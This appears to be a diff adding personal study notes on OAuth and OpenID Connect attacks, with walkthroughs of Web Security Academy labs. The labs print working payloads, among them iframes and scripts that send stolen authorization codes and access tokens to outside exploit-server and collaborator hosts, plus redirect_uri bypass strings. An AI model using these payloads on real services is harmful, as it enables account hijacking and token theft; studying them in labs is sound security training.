@@ -217,6 +217,135 @@ We can send request to the following endpoint to gather further information once
 
 #### Improper implementation of the implicit grant type 
 
+1. Data get's sent through URL fragment. 
+2. Client applicaiton access token via javaScript.
+3. To maintain the authentication it then sends a `POST` request and then assigns a session cookie, For effectively logging them in.
+4. In this case the server does not have a way to compare data submmited.
+5. As the token is sent from the browser as `POST` request the attacker may impoersonate the user if it's not properly validate the token.
+
+
+#### Flawed CSRF protection
+`state` parameter is used as CSRF token for the client application. If the `state` token is missing and attacker could initate the authorization process and send it to the victim to complete the further process just like the traditional `CSRF` attacks.
+
+#### Leaking authorization codes and access tokens
+
+If the client application is unable to validate the `redirect_uri` properly, the users browser will be sending the token or code over `/callback` in the `redirect_uri` parameter.
+
+An attacker maybe able to user CSRF like attack tricking the user to iniate the OAuth flow and sending the token or code to the attacker controlled URI.
+
+
+#### Flawed redirect_uri validation
+
+When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example: 
+
+* You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error
+* If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as
+    ```
+    https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
+    ```
+* You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:
+    ```
+    https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
+    ```
+* Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`
+* It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`
+
+#### Stealing codes and access tokens via a proxy page
+* If the `redirect_uri` cannot be bypassed 
+* check if you are able to set the `redirect_uri` to different part of the page itself.
+
+### In addition to open redirect the following attacks should also be explored
+* **Dangerous JavaScript that handles query parameters and URL fragments**  
+Identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain
+
+* **XSS vulnerabilities** 
+Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the HTTPOnly attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability
+
+* **HTML injection vulnerabilities**
+In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the redirect_uri parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the Referer header. For example, consider the following img element: <img src="evil-user.net">. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the Referer header of the request, including the query string.
+
+### Flawed scope validation
+The user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type. 
+
+### Scope upgrade: authorization code flow
+the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service
+
+let's say the attacker's malicious client application initially requested access to the user's email address using the openid email scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another scope parameter to the code/token exchange request containing the additional profile scope
+
+```
+POST /token
+Host: oauth-authorization-server.com
+…
+client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
+```
+
+If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application
+
+```json
+{
+    "access_token": "z0y9x8w7v6u5",
+    "token_type": "Bearer",
+    "expires_in": 3600,
+    "scope": "openid email profile",
+    …
+}
+```
+
+ The attacker can then use their application to make the necessary API calls to access the user's profile data. 
+
+
+### Scope upgrade: implicit flow
+the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's /userinfo endpoint, manually adding a new scope parameter in the process.
+
+Ideally, the OAuth service should validate this scope value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user. 
+
+### Unverified user registration
+ When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.
+
+Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider. 
+
+
+## Extending OAuth with OpenID Connect
+### OpenID Connect
+OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. It adds some simple functionality that enables better support for the authentication use case of OAuth.
+
+OpenID Connect slots neatly into the normal OAuth flows. From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: `id_token`
+
+### OpenID Connect roles
+The roles for OpenID Connect are essentially the same as for standard OAuth. The main difference is that the specification usages slightly different terminology.
+
+* **Relying party** - The application that is requesting authentication of a user
+* **End user** - The user whois being authenticated.
+* **OpenID provider** - An OAuth service that is configured to support OpenID Connect
+
+### OpenID Connect claims and scopes 
+The term "claims" refers to the ```key:value``` pairs that represent information about the user on the resource.
+
+In order to use OpenID Connect, the client application must specify the scope `openid`in the authorization request. They can then include one or more of the other standard scopes: 
+
+```
+profile
+email
+address
+phone
+```
+
+### ID token
+The other main addition provided by OpenID Connect is the `id_token` response type. This returns a JSON web token (JWT) signed with a J`SON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested. It also contains information about how and when the user was last authenticated by the OAuth service. The client application can use this to decide whether or not the user has been sufficiently authenticated
+
+The use of ID tokens may help protect against some man-in-the-middle attacks. However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on /.well-known/jwks.json), some attacks are still possible. 
+
+```
+response_type=id_token token
+response_type=id_token code
+```
+
+### Identifying OpenID Connect
+If OpenID connect is actively being used by the client application, this should be obvious from the authorization request. The most foolproof way to check is to look for the mandatory `openid` scope. 
+
+ Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the openid scope or changing the response type to id_token and observing whether this results in an error.
+
+As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`. 
 
 # Labs 
 
@@ -225,4 +354,75 @@ We can send request to the following endpoint to gather further information once
 1. We logged in using social media and found out that it's using token based OAuth grant type.
 2. Now we checked each request and found out that on the endpoint `/authenticate` Along with the access token, username and email is being passed which we than changed it to carlos.
 3. Forwarding the request provided access to carlos account.
+
+## Lab: Forced OAuth profile linking
+1. Login into wiener account 
+2. Click on attach social media profile
+3. On the endpoint `/oauth-linking?code={}` copy the request and put it in 
+    ```html
+    <iframe src="http://YOURLABID.web-security-academy.net/oauth-linking?code=STOLEN-CODE/"></ifrmae>"
+    ``` 
+4. Store it on exploit server and deliver it to the Victim you should be able to login as carlos.
+
+
+## Lab: OAuth account hijacking via redirect_uri
+
+1. Login into your own account 
+2. An OAuth authorization should be initiated by now
+3. As there the `redirect_uri` is not properly being validated it's likely vulnerable to open redirection to Account hijacking.
+4. Now create a CSRF type of attack which iniates the OAuth flow but update the redirect uri to attacker controlled uri and the attack should work.
+
+    ```html
+    <iframe src='https://oauth-0a02001104f5135e80d447dd022f00c8.oauth-server.net/auth?client_id=ch8ubea54mbf1xb542r1r&redirect_uri=https://von7c7w2q4ifttsoog8qogbp8ge72yqn.oastify.com/&response_type=code'></iframe>
+    ```
+
+
+## Lab: Stealing OAuth access tokens via an open redirect
+
+1. Login using the account of the wiener
+2. Check the request that is initiating the OAuth
+3. Now check if you could bypass the `redirect_uri`
+4. Validation is not allowing the external domains 
+5. Find an open redirect `/post/next?path=evil.com`
+6. Path traversal is allowed   
+Combininig all the payloads 
+    ```html
+    <script>
+        if (!document.location.hash) {
+            window.location = 'https://oauth-0aed00ac047e254e80ba5b8a029a0017.oauth-server.net/auth?client_id=myp31oljr7tvsjmeph3wx&redirect_uri=https://0a0d007504812525807b5d3200b300dd.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5600d504d2258c80315c3801e90045.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+        } else {
+            window.location = '/?'+document.location.hash.substr(1)
+        }
+    </script>
+    ```
+7. Store the payload and deliver it to the victim
+8. You can find the `/me` endpoint where you can update the `Authorization` token and access the `Administrators` account. 
+8. You will get api key and submitting it will solve the lab.
+
+## Lab: Stealing OAuth access tokens via a proxy page
+
+1. Login and check oauth flow
+2. Monitor the comment section wheee you can find the issue.  
+*Observe that the comment form is included as an iframe on each blog post. Look closer at the /post/comment/comment-form page in Burp and notice that it uses the postMessage() method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin (*).*
+3. Use the following payload in exploit server.
+    ```html
+        <html>
+        <head>
+            <title>OAuth</title>
+        </head>"9lZEeDD94VlKtY8zUToJaWVCFOeQn3gH"
+        <body>
+            <iframe src="https://oauth-0ad500d80453f28980bd476c029400d2.oauth-server.net/auth?client_id=rudeq5fsnd2uv728bzb7z&redirect_uri=https://0aa900f604a9f208808c4956001000a1.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=688455368&scope=openid%20profile%20email"></iframe>
+
+            <script type="text/javascript">
+                // Listen for web messages
+                window.addEventListener('message', function(e) {
+                    // Output to the exploit server access log
+                    fetch('https://exploit-0af600110405f2b0800f488f010d003f.exploit-server.net/log?data=' + encodeURIComponent(e.data.data))
+                }, false)
+            </script>
+        </body>
+    </html>
+
+    ```
+4. Once you load the attack use the access token on authorizatoion header and get the administrators api key.
 
